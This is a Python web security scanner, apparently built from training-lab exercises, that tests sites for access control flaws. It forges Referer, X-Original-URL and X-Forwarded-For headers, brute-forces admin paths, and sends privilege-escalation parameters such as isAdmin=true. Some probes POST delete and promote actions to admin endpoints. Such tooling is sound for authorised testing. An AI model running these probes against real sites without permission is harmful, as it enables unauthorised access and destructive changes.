"""
Hunter v5 — Auto Access Control Engine

Detects access control vulnerabilities based on patterns from 72 solved labs:

1. Referer-based access control bypass (Lab #70)
2. Multi-step process bypass (Lab #72)
3. Role parameter tampering (Lab #25)
4. Unprotected admin functionality (Lab #39)
5. URL-based access control bypass (X-Original-URL / X-Rewrite-URL)
6. Method-based access control bypass (GET vs POST vs PUT)
7. User ID parameter tampering (cookie-based)
"""

import re
import time
from urllib.parse import urlparse, urljoin
from typing import Optional


def _get_session():
    """Get HTTP session with fallback."""
    try:
        from tools.probe import _get_session as _gs
        return _gs()
    except (ImportError, ModuleNotFoundError):
        import requests
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        return s


def _get_base_url(url: str) -> str:
    """Extract base URL (scheme + host)."""
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def _is_unauthorized(resp_status: int, resp_body: str) -> bool:
    """Check if response indicates unauthorized access."""
    if resp_status in (401, 403):
        return True
    # Check for common denial patterns in body
    lower = resp_body.lower()
    denial_patterns = [
        'unauthorized', 'forbidden', 'access denied', 'permission denied',
        'not authorized', 'login required', 'please log in', 'please sign in',
        'admin only', 'insufficient privileges', 'access is denied',
    ]
    return any(p in lower for p in denial_patterns)


def _is_success(resp_status: int, resp_body: str) -> bool:
    """Check if response indicates successful access."""
    if resp_status == 200:
        return True
    if resp_status in (301, 302, 303, 307, 308):
        return False
    return False


# ── Admin path dictionary ──────────────────────────────────────────────
ADMIN_PATHS = [
    '/admin', '/admin/', '/administrator', '/administrator-panel',
    '/admin-panel', '/admin-roles', '/admin/login', '/admin/dashboard',
    '/admin/config', '/admin/users', '/admin/settings', '/admin/console',
    '/admin/pages', '/admin/manage', '/admin/management',
    '/backoffice', '/backend', '/controlpanel', '/cpanel',
    '/manager', '/management', '/panel', '/console',
    '/internal', '/staff', '/moderator', '/moderation',
    '/cms', '/cms/admin', '/wp-admin', '/wp-login.php',
    '/admin.php', '/admin.html', '/admin.aspx',
    '/dashboard', '/admin/dashboard',
]

REFERER_BYPASS_PATHS = [
    '/admin', '/admin-roles', '/admin/delete',
    '/admin/promote', '/admin/manage',
    '/administrator-panel', '/admin/settings',
]


# ── 1. Referer-based access control bypass ─────────────────────────────

def test_referer_bypass(url: str, admin_path: str = "/admin",
                        cookie: str = "") -> dict:
    """Test if server trusts Referer header for authorization.

    Sends requests with manipulated Referer headers pointing to admin pages.
    Some servers only check if the Referer contains an admin URL, not whether
    the user actually has admin privileges.

    Lab #70 pattern: Referer header used for access control decisions.
    """
    result = {
        "test": "referer_bypass",
        "vulnerable": False,
        "findings": [],
        "details": [],
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    base = _get_base_url(url)
    target_url = urljoin(base, admin_path)

    # Different Referer strategies to try
    referer_strategies = [
        ("admin_in_path", f"{base}/admin"),
        ("admin_trailing_slash", f"{base}/admin/"),
        ("admin_subpath", f"{base}/admin/dashboard"),
        ("localhost_admin", f"http://localhost/admin"),
        ("target_admin", target_url),
    ]

    for strategy_name, referer in referer_strategies:
        try:
            resp = session.get(
                target_url,
                headers={'Referer': referer},
                timeout=10,
                allow_redirects=False,
            )

            detail = {
                "strategy": strategy_name,
                "referer": referer,
                "status": resp.status_code,
                "body_length": len(resp.text),
            }
            result["details"].append(detail)

            if _is_success(resp.status_code, resp.text) and not _is_unauthorized(resp.status_code, resp.text):
                # Verify this is actually different from no-referer
                baseline = session.get(target_url, timeout=10, allow_redirects=False)
                if _is_unauthorized(baseline.status_code, baseline.text):
                    result["vulnerable"] = True
                    result["findings"].append({
                        "type": "referer_bypass",
                        "severity": "high",
                        "description": f"Server grants access based on Referer header",
                        "evidence": f"Referer: {referer} -> {resp.status_code} (baseline: {baseline.status_code})",
                        "refer": "Lab #70",
                    })
                    break

        except Exception as e:
            result["details"].append({
                "strategy": strategy_name,
                "error": str(e),
            })

    return result


# ── 2. Multi-step process bypass ───────────────────────────────────────

def test_multistep_bypass(url: str, step1_path: str = "",
                          step2_path: str = "", cookie: str = "") -> dict:
    """Test if authorization only checked on first step of multi-step process.

    Many admin workflows check credentials only at step 1, then assume the
    session is authorized for subsequent steps. Skipping step1 and going
    directly to step2 bypasses the check.

    Lab #72 pattern: Promotion workflow with step1 (admin check) and
    step2 (actual action).
    """
    result = {
        "test": "multistep_bypass",
        "vulnerable": False,
        "findings": [],
        "details": [],
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    base = _get_base_url(url)

    # Common multi-step admin action patterns
    if not step1_path and not step2_path:
        # Auto-discover common patterns
        step_pairs = [
            ("/admin", "/admin-roles"),
            ("/admin-roles", "/admin-roles"),
            ("/admin/promote-step1", "/admin/promote-step2"),
            ("/admin/delete-confirmation", "/admin/delete"),
        ]
    else:
        step_pairs = [(step1_path, step2_path)]

    for s1, s2 in step_pairs:
        s2_url = urljoin(base, s2)

        try:
            # Skip step1, go directly to step2
            resp = session.get(s2_url, timeout=10, allow_redirects=False)
            detail = {
                "step2_url": s2_url,
                "status": resp.status_code,
                "body_length": len(resp.text),
            }

            if _is_success(resp.status_code, resp.text):
                detail["accessed_without_step1"] = True
                result["vulnerable"] = True
                result["findings"].append({
                    "type": "multistep_bypass",
                    "severity": "high",
                    "description": f"Step2 accessible without completing step1",
                    "evidence": f"Direct access to {s2} returned {resp.status_code}",
                    "refer": "Lab #72",
                })

            # Also try POST to step2 with action parameters
            post_data_variants = [
                {"action": "promote", "role": "administrator"},
                {"action": "confirm", "confirmed": "true"},
                {"action": "delete", "confirm": "yes"},
            ]

            for pdata in post_data_variants:
                try:
                    resp_post = session.post(
                        s2_url, data=pdata, timeout=10, allow_redirects=False
                    )
                    if _is_success(resp_post.status_code, resp_post.text):
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "multistep_bypass",
                            "severity": "high",
                            "description": f"POST to step2 succeeded without step1",
                            "evidence": f"POST {s2} with {pdata} -> {resp_post.status_code}",
                            "refer": "Lab #72",
                        })
                        break
                except Exception:
                    pass

            result["details"].append(detail)

        except Exception as e:
            result["details"].append({"step2_url": s2_url, "error": str(e)})

    return result


# ── 3. Role parameter tampering ────────────────────────────────────────

def test_role_tampering(url: str, cookie: str = "") -> dict:
    """Test if user role can be changed via request parameters.

    Tries adding/modifying role-related parameters in POST data to escalate
    privileges. Common parameters: role, admin, isAdmin, access_level, etc.

    Lab #25 pattern: Role stored in client-controlled parameter.
    """
    result = {
        "test": "role_tampering",
        "vulnerable": False,
        "findings": [],
        "details": [],
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    base = _get_base_url(url)

    # Parameter name -> values to try
    role_params = {
        "Admin": ["true"],
        "admin": ["true", "1"],
        "isAdmin": ["true", "1"],
        "role": ["admin", "administrator", "superadmin"],
        "access_level": ["admin", "999", "100"],
        "user_type": ["admin", "administrator"],
        "privilege": ["admin", "high"],
        "is_admin": ["true", "1"],
    }

    # Endpoints to test role tampering on
    profile_paths = ['/my-account', '/profile', '/account', '/settings',
                     '/my-account/change-email', '/api/user', '/user/profile']
    profile_paths.insert(0, urlparse(url).path or '/')

    tested_urls = set()

    for path in profile_paths:
        target = urljoin(base, path)
        if target in tested_urls:
            continue
        tested_urls.add(target)

        # First get the page to see existing form fields
        try:
            baseline = session.get(target, timeout=10)
            # Check if any role params are already in the page source
            body_lower = baseline.text.lower()
        except Exception:
            body_lower = ""

        for param, values in role_params.items():
            for val in values:
                try:
                    # Try as POST parameter
                    resp = session.post(
                        target,
                        data={param: val},
                        timeout=10,
                        allow_redirects=False,
                    )

                    detail = {
                        "url": target,
                        "param": param,
                        "value": val,
                        "method": "POST",
                        "status": resp.status_code,
                    }

                    if _is_success(resp.status_code, resp.text):
                        # Verify admin content appeared
                        admin_indicators = [
                            'admin panel', 'admin dashboard', 'administrator',
                            'admin-roles', 'role:', 'admin privileges',
                            'welcome admin', 'admin access',
                        ]
                        body_lower_resp = resp.text.lower()
                        if any(ind in body_lower_resp for ind in admin_indicators):
                            detail["admin_content_detected"] = True
                            result["vulnerable"] = True
                            result["findings"].append({
                                "type": "role_tampering",
                                "severity": "critical",
                                "description": f"Role escalation via {param}={val}",
                                "evidence": f"POST {target} {param}={val} -> {resp.status_code} with admin content",
                                "refer": "Lab #25",
                            })

                    result["details"].append(detail)

                except Exception as e:
                    pass

    # Also try adding role params to the original URL as query string
    for param, values in role_params.items():
        for val in values:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={val}"
                resp = session.get(test_url, timeout=10, allow_redirects=False)
                if _is_success(resp.status_code, resp.text):
                    admin_indicators = ['admin', 'administrator', 'privilege']
                    if any(ind in resp.text.lower() for ind in admin_indicators):
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "role_tampering",
                            "severity": "critical",
                            "description": f"Role escalation via query param {param}={val}",
                            "evidence": f"GET {test_url} -> {resp.status_code}",
                            "refer": "Lab #25",
                        })
            except Exception:
                pass

    return result


# ── 4. Unprotected admin functionality ─────────────────────────────────

def test_unprotected_admin(url: str, cookie: str = "") -> dict:
    """Test for unprotected admin functionality.

    Checks common admin paths, robots.txt for hidden paths, and
    JavaScript source for admin links.

    Lab #39 pattern: Admin panel accessible without authentication,
    discoverable via robots.txt or source analysis.
    """
    result = {
        "test": "unprotected_admin",
        "vulnerable": False,
        "findings": [],
        "admin_paths_found": [],
        "robots_disallowed": [],
        "details": [],
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    base = _get_base_url(url)

    # 1. Check robots.txt for hidden admin paths
    try:
        robots_url = f"{base}/robots.txt"
        resp = session.get(robots_url, timeout=10)
        if resp.status_code == 200:
            # Extract Disallow paths
            disallowed = re.findall(r'Disallow:\s*(/\S*)', resp.text)
            for path in disallowed:
                result["robots_disallowed"].append(path)
                # Check if the disallowed path is accessible
                try:
                    admin_url = urljoin(base, path)
                    admin_resp = session.get(admin_url, timeout=10, allow_redirects=False)
                    if _is_success(admin_resp.status_code, admin_resp.text):
                        result["vulnerable"] = True
                        result["admin_paths_found"].append({
                            "path": path,
                            "source": "robots.txt",
                            "status": admin_resp.status_code,
                        })
                        result["findings"].append({
                            "type": "unprotected_admin",
                            "severity": "critical",
                            "description": f"Admin path from robots.txt accessible without auth",
                            "evidence": f"robots.txt Disallow: {path} -> accessible ({admin_resp.status_code})",
                            "refer": "Lab #39",
                        })
                except Exception:
                    pass
    except Exception:
        pass

    # 2. Brute force common admin paths
    for path in ADMIN_PATHS:
        try:
            admin_url = urljoin(base, path)
            resp = session.get(admin_url, timeout=10, allow_redirects=False)

            if _is_success(resp.status_code, resp.text):
                # Confirm it's actually admin content, not a generic 200
                body_lower = resp.text.lower()
                admin_keywords = [
                    'admin', 'administrator', 'dashboard', 'management',
                    'control panel', 'back office', 'staff', 'moderator',
                    'delete user', 'promote', 'role', 'privilege',
                ]
                if any(kw in body_lower for kw in admin_keywords):
                    result["vulnerable"] = True
                    result["admin_paths_found"].append({
                        "path": path,
                        "source": "bruteforce",
                        "status": resp.status_code,
                        "body_snippet": resp.text[:200],
                    })
                    result["findings"].append({
                        "type": "unprotected_admin",
                        "severity": "critical",
                        "description": f"Unprotected admin panel at {path}",
                        "evidence": f"GET {admin_url} -> {resp.status_code}, admin keywords detected",
                        "refer": "Lab #39",
                    })

        except Exception:
            pass

    # 3. Check main page source for admin links
    try:
        main_resp = session.get(url, timeout=10)
        # Find href links containing admin keywords
        links = re.findall(r'href=["\']([^"\']*(?:admin|manager|panel|backend|staff)[^"\']*)["\']',
                           main_resp.text, re.IGNORECASE)
        for link in links:
            try:
                link_url = urljoin(base, link)
                resp = session.get(link_url, timeout=10, allow_redirects=False)
                if _is_success(resp.status_code, resp.text):
                    result["admin_paths_found"].append({
                        "path": link,
                        "source": "html_link",
                        "status": resp.status_code,
                    })
                    result["findings"].append({
                        "type": "unprotected_admin",
                        "severity": "high",
                        "description": f"Admin link found in page source and accessible",
                        "evidence": f"Link: {link} -> {resp.status_code}",
                        "refer": "Lab #39",
                    })
                    result["vulnerable"] = True
            except Exception:
                pass
    except Exception:
        pass

    return result


# ── 5. URL-based access control bypass ─────────────────────────────────

def test_url_based_bypass(url: str, admin_path: str = "/admin",
                          cookie: str = "") -> dict:
    """Test if access control relies on URL path.

    Some applications use a front-end component that maps URLs to back-end
    resources. Manipulating the original URL header can bypass access control.

    Tries: X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Custom-IP-Authorization.
    """
    result = {
        "test": "url_based_bypass",
        "vulnerable": False,
        "findings": [],
        "details": [],
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    base = _get_base_url(url)
    target_admin = urljoin(base, admin_path)

    # Headers that can override URL resolution
    bypass_headers = [
        ("X-Original-URL", admin_path),
        ("X-Rewrite-URL", admin_path),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Host", "localhost"),
    ]

    # Get baseline (should be blocked)
    try:
        baseline = session.get(target_admin, timeout=10, allow_redirects=False)
        baseline_blocked = _is_unauthorized(baseline.status_code, baseline.text)
    except Exception:
        baseline_blocked = True

    # Try bypassing on the base URL (not admin path)
    for header_name, header_value in bypass_headers:
        try:
            resp = session.get(
                url,
                headers={header_name: header_value},
                timeout=10,
                allow_redirects=False,
            )

            detail = {
                "header": header_name,
                "value": header_value,
                "status": resp.status_code,
                "body_length": len(resp.text),
            }

            if _is_success(resp.status_code, resp.text) and not _is_unauthorized(resp.status_code, resp.text):
                if baseline_blocked:
                    detail["bypass_detected"] = True
                    result["vulnerable"] = True
                    result["findings"].append({
                        "type": "url_based_bypass",
                        "severity": "high",
                        "description": f"Access control bypassed via {header_name} header",
                        "evidence": f"{header_name}: {header_value} -> {resp.status_code} (admin baseline blocked)",
                    })
                elif admin_path.lstrip('/').lower() in resp.text.lower():
                    # Even if not blocked, check if admin content appeared
                    detail["admin_content_in_response"] = True
                    result["vulnerable"] = True
                    result["findings"].append({
                        "type": "url_based_bypass",
                        "severity": "high",
                        "description": f"Admin content returned via {header_name} header",
                        "evidence": f"{header_name}: {header_value} -> admin content in response",
                    })

            result["details"].append(detail)

        except Exception as e:
            result["details"].append({
                "header": header_name,
                "error": str(e),
            })

    # Also try path traversal in URL
    traversal_variants = [
        f"{url.rstrip('/')}/./{admin_path.lstrip('/')}",
        f"{url.rstrip('/')}/%2e/{admin_path.lstrip('/')}",
        f"{url.rstrip('/')}/{admin_path.lstrip('/')}%00",
        f"{url.rstrip('/')}/{admin_path.lstrip('/')}?",
        f"{url.rstrip('/')}/{admin_path.lstrip('/')}#",
    ]

    for variant_url in traversal_variants:
        try:
            resp = session.get(variant_url, timeout=10, allow_redirects=False)
            if _is_success(resp.status_code, resp.text) and baseline_blocked:
                result["vulnerable"] = True
                result["findings"].append({
                    "type": "url_based_bypass",
                    "severity": "high",
                    "description": f"Access control bypassed via URL manipulation",
                    "evidence": f"GET {variant_url} -> {resp.status_code}",
                })
        except Exception:
            pass

    return result


# ── 6. Method-based access control bypass ───────────────────────────────

def test_method_bypass(url: str, admin_path: str = "/admin",
                       cookie: str = "") -> dict:
    """Test if access control depends on HTTP method.

    Some applications check authorization only for GET but not POST/PUT/DELETE,
    or vice versa. Try different methods on admin endpoints.
    """
    result = {
        "test": "method_bypass",
        "vulnerable": False,
        "findings": [],
        "details": [],
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    base = _get_base_url(url)
    target_admin = urljoin(base, admin_path)

    methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

    for method in methods:
        try:
            if method == "GET" or method == "HEAD" or method == "OPTIONS":
                resp = session.request(method, target_admin, timeout=10, allow_redirects=False)
            else:
                resp = session.request(method, target_admin, data={}, timeout=10, allow_redirects=False)

            detail = {
                "method": method,
                "status": resp.status_code,
                "body_length": len(resp.text),
            }
            result["details"].append(detail)

            if _is_success(resp.status_code, resp.text) and method not in ("OPTIONS", "HEAD"):
                # Check if this method grants access while others don't
                result["vulnerable"] = True
                result["findings"].append({
                    "type": "method_bypass",
                    "severity": "high",
                    "description": f"Admin endpoint accessible via {method} method",
                    "evidence": f"{method} {target_admin} -> {resp.status_code}",
                })

        except Exception as e:
            result["details"].append({"method": method, "error": str(e)})

    return result


# ── Main scan function ─────────────────────────────────────────────────

def scan(url: str, cookie: str = "") -> dict:
    """Run full access control vulnerability scan.

    Combines all test methods into a single comprehensive scan.

    Returns dict with:
        - url: target URL
        - findings: list of vulnerability findings
        - tests: individual test results
        - severity: highest severity found
        - vulnerable: bool
    """
    results = {
        "url": url,
        "findings": [],
        "tests": {},
        "severity": "info",
        "vulnerable": False,
        "admin_paths_found": [],
    }

    severity_order = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}

    def update_severity(new_sev: str):
        current = severity_order.get(results["severity"], 0)
        if severity_order.get(new_sev, 0) > current:
            results["severity"] = new_sev

    # 1. Unprotected admin (fast, most likely to find something)
    print("[*] Testing unprotected admin paths...")
    r = test_unprotected_admin(url, cookie)
    results["tests"]["unprotected_admin"] = r
    results["admin_paths_found"] = r.get("admin_paths_found", [])
    if r["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(r["findings"])
        update_severity("critical")

    # 2. Referer-based bypass
    print("[*] Testing Referer-based access control bypass...")
    r = test_referer_bypass(url, cookie=cookie)
    results["tests"]["referer_bypass"] = r
    if r["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(r["findings"])
        update_severity("high")

    # 3. URL-based bypass (headers)
    print("[*] Testing URL-based access control bypass...")
    r = test_url_based_bypass(url, cookie=cookie)
    results["tests"]["url_based_bypass"] = r
    if r["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(r["findings"])
        update_severity("high")

    # 4. HTTP method bypass
    print("[*] Testing HTTP method-based bypass...")
    r = test_method_bypass(url, cookie=cookie)
    results["tests"]["method_bypass"] = r
    if r["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(r["findings"])
        update_severity("high")

    # 5. Role parameter tampering
    print("[*] Testing role parameter tampering...")
    r = test_role_tampering(url, cookie)
    results["tests"]["role_tampering"] = r
    if r["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(r["findings"])
        update_severity("critical")

    # 6. Multi-step bypass
    print("[*] Testing multi-step process bypass...")
    r = test_multistep_bypass(url, cookie=cookie)
    results["tests"]["multistep_bypass"] = r
    if r["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(r["findings"])
        update_severity("high")

    results["total_findings"] = len(results["findings"])
    print(f"\n[+] Scan complete: {results['total_findings']} findings, severity={results['severity']}")

    return results


# ── CLI entry point ────────────────────────────────────────────────────

def main():
    import sys
    if len(sys.argv) < 2:
        print("Usage: python auto_access_control.py <url> [cookie]")
        print("       python auto_access_control.py https://target.com")
        print("       python auto_access_control.py https://target.com 'session=abc123'")
        print("\nIndividual tests:")
        print("       python auto_access_control.py --test referer https://target.com")
        print("       python auto_access_control.py --test admin https://target.com")
        print("       python auto_access_control.py --test url-bypass https://target.com")
        print("       python auto_access_control.py --test method https://target.com")
        print("       python auto_access_control.py --test role https://target.com")
        print("       python auto_access_control.py --test multistep https://target.com")
        sys.exit(1)

    # Parse args
    cookie = ""
    test_name = ""
    url = ""

    if sys.argv[1] == "--test":
        if len(sys.argv) < 4:
            print("Usage: python auto_access_control.py --test <test_name> <url> [cookie]")
            sys.exit(1)
        test_name = sys.argv[2]
        url = sys.argv[3]
        if len(sys.argv) > 4:
            cookie = sys.argv[4]
    else:
        url = sys.argv[1]
        if len(sys.argv) > 2:
            cookie = sys.argv[2]

    print(f"Target: {url}")
    if cookie:
        print(f"Cookie: {cookie[:40]}...")
    print("=" * 60)

    if test_name:
        # Run specific test
        test_map = {
            "referer": lambda: test_referer_bypass(url, cookie=cookie),
            "admin": lambda: test_unprotected_admin(url, cookie),
            "url-bypass": lambda: test_url_based_bypass(url, cookie=cookie),
            "method": lambda: test_method_bypass(url, cookie=cookie),
            "role": lambda: test_role_tampering(url, cookie),
            "multistep": lambda: test_multistep_bypass(url, cookie=cookie),
        }
        if test_name not in test_map:
            print(f"Unknown test: {test_name}")
            print(f"Available: {', '.join(test_map.keys())}")
            sys.exit(1)

        result = test_map[test_name]()
        import json
        print(json.dumps(result, indent=2, default=str))
    else:
        # Full scan
        import json
        result = scan(url, cookie)
        print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
